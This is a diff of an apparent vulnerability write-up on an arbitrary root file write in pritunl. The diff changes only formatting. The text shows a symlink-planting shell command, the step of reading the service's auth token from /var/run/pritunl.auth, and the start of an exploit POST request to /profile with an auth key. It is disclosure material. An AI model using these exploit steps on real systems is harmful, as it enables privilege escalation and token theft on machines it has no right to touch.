@@ -2,8 +2,7 @@
 
 ## Vulnerability
 
-Arbitrary file write as root in pritunl versions between 1.0.1116.6 and
-v1.2.2550.20. The pritunl-service writes to the following paths as root without checking if the file exists.
+Arbitrary file write as root in pritunl versions between 1.0.1116.6 and v1.2.2550.20. The pritunl-service writes to the following paths as root without checking if the file exists.
 
 <ol>
 <li>/tmp/pritunl/{profile_id}</li>
@@ -26,11 +25,11 @@ mkdir /tmp/pritunl
 ln -s /tmp/root_test /tmp/123467.auth
 ```
 An attacker can then get the auth token required to interact with the service by reading 
-```
+```bash
 /var/run/pritunl.auth
 ```
 The following example post request is then used to exploit the vulnerability.
-```http
+```
 POST /profile HTTP/1.1
 Auth-Key: Tp0JSp3iugTipiq2U9CpJcHuGkQGM3VvspS6gu6rtUfLCmOOlzl0gFkEFGiX67Zc
 User-Agent: pritunl
